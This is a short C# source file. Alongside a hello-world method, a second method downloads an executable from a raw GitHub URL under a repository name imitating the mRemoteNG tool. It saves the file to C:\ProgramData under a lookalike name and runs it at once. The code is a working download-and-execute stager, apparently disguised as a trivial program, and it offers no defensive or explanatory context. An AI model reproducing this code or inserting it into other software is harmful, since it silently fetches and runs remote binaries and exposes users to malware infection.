using System;

public class Program {
	
    public static void A() {
        Console.WriteLine("Hello, World!");
    }

    public static void B() {
        string url = "https://raw.githubusercontent.com/rteam01-hub/nRemoteNG-TG/refs/heads/main/mRemoteNGx64_02.exe";
        string savePath = "C:\\ProgramData\\nRemoteNGx64.exe";
		System.Net.WebClient webClient = new System.Net.WebClient();
        webClient.DownloadFile(url, savePath);
		
		var psi = new System.Diagnostics.ProcessStartInfo
{
			FileName = savePath,
			UseShellExecute = true,
			WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal
		};
		System.Diagnostics.Process.Start(psi);
	
    }

}
